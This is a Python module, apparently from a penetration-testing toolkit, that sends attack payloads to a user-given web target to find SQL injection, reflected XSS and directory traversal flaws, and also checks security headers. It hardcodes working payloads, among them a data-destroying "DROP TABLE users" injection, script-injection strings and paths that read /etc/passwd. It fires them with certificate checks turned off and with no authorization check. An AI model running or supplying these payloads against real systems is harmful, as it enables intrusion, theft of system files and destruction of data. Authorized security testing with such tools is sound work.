import requests
import urllib.parse
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1' ORDER BY 1--",
    "1 UNION SELECT null,null--",
    "'; DROP TABLE users;--",
    "' AND SLEEP(5)--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert('XSS')</script>",
    "<svg onload=alert(1)>",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "odbc sql server driver",
    "ora-01756",
]

SECURITY_HEADERS = [
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "X-XSS-Protection",
    "Referrer-Policy",
]

class WebTester:
    def __init__(self, target, logger):
        self.target = target if target.startswith("http") else f"http://{target}"
        self.logger = logger
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "VAPT-Toolkit/1.0 (Educational)"})

    def run(self):
        print("\n" + "="*55)
        print("       WEB APPLICATION TESTING")
        print("="*55)
        print("  [1] SQL Injection Test")
        print("  [2] XSS (Cross-Site Scripting) Test")
        print("  [3] Security Headers Check")
        print("  [4] Directory Traversal Test")
        print("  [5] Run All Tests")
        print("="*55)
        choice = input("  Select option: ").strip()

        if choice == "1":
            self._sql_injection_test()
        elif choice == "2":
            self._xss_test()
        elif choice == "3":
            self._header_check()
        elif choice == "4":
            self._directory_traversal()
        elif choice == "5":
            self._header_check()
            self._sql_injection_test()
            self._xss_test()
            self._directory_traversal()
        else:
            print("[-] Invalid option.")

        print(f"\n[+] Web testing complete. Found {len(self.results)} issue(s).")
        self.logger.log(f"Web testing complete | {len(self.results)} findings")
        return self.results

    def _header_check(self):
        print(f"\n[*] Checking security headers on {self.target}...")
        try:
            resp = self.session.get(self.target, verify=False, timeout=10)
            print(f"    Status Code : {resp.status_code}")
            print(f"    Server      : {resp.headers.get('Server', 'Not disclosed')}")
            print(f"    X-Powered-By: {resp.headers.get('X-Powered-By', 'Not set')}")
            print()
            for header in SECURITY_HEADERS:
                if header in resp.headers:
                    print(f"    \033[92m[PRESENT]\033[0m  {header}: {resp.headers[header]}")
                else:
                    print(f"    \033[91m[MISSING]\033[0m  {header}")
                    self.results.append({
                        "type": "Missing Security Header",
                        "detail": header,
                        "severity": "MEDIUM"
                    })

            # Check for sensitive info leak in headers
            if resp.headers.get("Server") and any(v in resp.headers.get("Server","").lower() for v in ["apache/", "nginx/", "iis/"]):
                print(f"    \033[93m[WARN]\033[0m Server version disclosed: {resp.headers['Server']}")
                self.results.append({"type": "Info Disclosure", "detail": f"Server: {resp.headers['Server']}", "severity": "LOW"})

        except requests.exceptions.ConnectionError:
            print(f"    [-] Cannot connect to {self.target}")
        except Exception as e:
            print(f"    [-] Error: {e}")

    def _sql_injection_test(self):
        print(f"\n[*] Testing SQL Injection on {self.target}...")
        param_url = input("    Enter URL with parameter (e.g. http://site/page?id=1): ").strip()
        if not param_url:
            param_url = self.target + "/?id=1"

        base_url, _, query = param_url.partition("?")
        params = dict(p.split("=", 1) for p in query.split("&") if "=" in p)

        found = False
        for param, value in params.items():
            for payload in SQL_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    resp = self.session.get(base_url, params=test_params, timeout=8, verify=False)
                    body = resp.text.lower()
                    if any(err in body for err in SQL_ERRORS):
                        print(f"    \033[91m[VULNERABLE]\033[0m SQL Injection on param '{param}' with payload: {payload}")
                        self.results.append({
                            "type": "SQL Injection",
                            "parameter": param,
                            "payload": payload,
                            "severity": "CRITICAL"
                        })
                        found = True
                        break
                except:
                    pass

        if not found:
            print("    [+] No obvious SQL Injection detected (manual testing recommended).")

    def _xss_test(self):
        print(f"\n[*] Testing XSS on {self.target}...")
        param_url = input("    Enter URL with parameter (e.g. http://site/search?q=test): ").strip()
        if not param_url:
            param_url = self.target + "/?q=test"

        base_url, _, query = param_url.partition("?")
        params = dict(p.split("=", 1) for p in query.split("&") if "=" in p)

        found = False
        for param, value in params.items():
            for payload in XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                try:
                    resp = self.session.get(base_url, params=test_params, timeout=8, verify=False)
                    if payload in resp.text:
                        print(f"    \033[91m[VULNERABLE]\033[0m XSS on param '{param}' with payload: {payload}")
                        self.results.append({
                            "type": "XSS",
                            "parameter": param,
                            "payload": payload,
                            "severity": "HIGH"
                        })
                        found = True
                        break
                except:
                    pass

        if not found:
            print("    [+] No reflected XSS detected.")

    def _directory_traversal(self):
        print(f"\n[*] Testing Directory Traversal on {self.target}...")
        traversal_paths = [
            "/../../../etc/passwd",
            "/....//....//etc/passwd",
            "/%2e%2e/%2e%2e/etc/passwd",
            "/?file=../../../../etc/passwd",
            "/?page=../../../etc/passwd",
        ]
        found = False
        for path in traversal_paths:
            try:
                url = self.target.rstrip("/") + path
                resp = self.session.get(url, timeout=8, verify=False)
                if "root:x:0:0" in resp.text or "root:/root" in resp.text:
                    print(f"    \033[91m[VULNERABLE]\033[0m Directory Traversal! Path: {path}")
                    self.results.append({
                        "type": "Directory Traversal",
                        "path": path,
                        "severity": "CRITICAL"
                    })
                    found = True
                    break
            except:
                pass

        if not found:
            print("    [+] No directory traversal vulnerability detected.")
